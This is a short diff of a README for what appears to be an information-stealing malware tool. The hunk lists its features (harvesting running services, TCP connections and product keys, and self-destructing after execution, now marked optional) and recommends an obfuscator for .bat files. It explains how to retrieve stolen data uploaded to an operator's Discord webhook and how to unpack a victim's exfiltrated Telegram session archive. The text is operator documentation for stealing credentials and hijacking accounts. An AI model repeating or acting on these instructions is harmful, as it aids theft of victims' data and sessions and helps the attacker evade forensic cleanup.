@@ -57,7 +57,7 @@ Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat file
 - [x] List of Running Services & Applications
 - [x] List TCP Connections and Underlying Process
 - [x] Extracts Product Key
-- [x] Self-Destructs After Execution
+- [x] Self-Destructs After Execution (optional)
 
 ### Telegram-Stealer Usage :
 After the exfiltrated data is uploaded to your discord webhook, download the compressed file KDOT.zip, inside that folder there will also be another zipped folder telegram-session.zip extract it on your PC.
